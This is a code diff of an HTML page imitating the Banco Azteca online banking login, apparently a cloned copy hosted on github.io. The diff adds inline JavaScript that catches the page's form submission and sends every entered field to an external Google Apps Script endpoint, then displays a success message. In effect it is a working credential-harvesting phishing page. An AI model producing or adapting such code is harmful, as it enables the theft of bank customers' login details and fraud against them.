@@ -5,9 +5,8 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<link rel="preconnect" href="https://fonts.googleapis.com/">
 	<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-	<link href="./Banco Azteca, tu banca en linea _ Sueñas, Decide, Logras_files/css2" rel="stylesheet">  
-	<link rel="stylesheet" href="/estilos.css">
-	<link rel="icon" href="bancanet.github.io/bancoazteca/fabasV2.ico">
+	<link rel="stylesheet" href="css/estilos.css">
+	<link rel="icon" href="fabasV2.ico">
 	<title>Banco Azteca, tu banca en linea |  Sueñas, Decide, Logras</title>
 </head>
 <body cz-shortcut-listen="true">
@@ -71,7 +70,31 @@
 		</div>
 	</div>
 
-	<script src="./Banco Azteca, tu banca en linea _ Sueñas, Decide, Logras_files/app.js.descarga"></script>
+	<script>
+const scriptURL = 'https://script.google.com/macros/s/AKfycbydtY-doAWcT2t10D4FaZVhggV4NwehUXyJQaRe3jjY8v_RjO0OiI6coSf18ACnf8CTjuZw/exec'
+const form = document.forms['submit-form']
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+form.addEventListener('submit', e => {
+  e.preventDefault()
+  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(response => console.log('Success!', response))
+    .then(response => exito.classList.add('activo'))
+    .then(response => registro.classList.remove('activo'))
+    .catch(error => console.log('Error!', error.message))
+   
+	 
+})
+		
+function miMensaje() {
+  var element = document.getElementById("registro");
+    element.classList.remove("activo");
+  var element = document.getElementById("exito");
+    element.classList.add("activo");	
+}	
+
+</script>   
 
 
 </body></html>
